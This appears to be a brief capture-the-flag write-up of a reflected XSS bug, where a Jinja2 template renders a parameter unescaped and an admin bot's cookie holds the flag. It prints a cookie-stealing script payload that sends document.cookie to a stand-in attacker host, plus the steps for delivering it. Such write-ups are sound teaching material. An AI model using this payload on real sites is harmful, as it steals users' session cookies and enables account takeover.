# XSS Writeup

1. **Vulnerability**: Reflected XSS at the `/?name=` parameter because the output uses `{{ name | safe }}` in Jinja2.
2. **Exploit Strategy**:
   - The flag is stored in the admin's cookie.
   - We create a payload that reads `document.cookie` and sends it to our webhook.
   - Payload: `<script>location='http://attacker.com/?c=' + document.cookie</script>`
3. **Execution**:
   - URL encode the payload.
   - Send `http://127.0.0.1/?name=%3Cscript...` to the `/report` endpoint.
   - Wait for the bot to visit the URL and execute the script.
   - Check the webhook to receive the flag.
